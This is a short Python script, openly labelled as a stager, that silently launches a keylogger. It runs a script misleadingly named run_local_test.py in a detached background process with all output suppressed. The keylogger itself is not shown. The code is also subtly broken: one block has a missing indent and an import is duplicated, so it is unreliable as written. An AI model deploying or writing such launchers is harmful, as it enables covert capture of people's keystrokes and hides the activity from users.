import os
import subprocess
import sys
import sys

def launch_keylogger():
	print("[*] Deploying keylogger from stager...")

	# Define the absolute path to the logger runner
	project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
	logger_script = os.path.join(project_root, 'scripts', 'run_local_test.py')

	if not os.path.exists(logger_script):
	print(f"[!] Keylogger launcher not found at: {logger_script}")
	sys.exit(1)

	# Run the keylogger in a new background process
	subprocess.Popen(['python3', logger_script],
			stdout=subprocess.DEVNULL,
			stderr=subprocess.DEVNULL,
			stdin=subprocess.DEVNULL)

	print("[+] Keylogger launched in background.")
	print("[*] Stager exiting cleanly.")

if __name__ == "__main__":
	launch_keylogger()
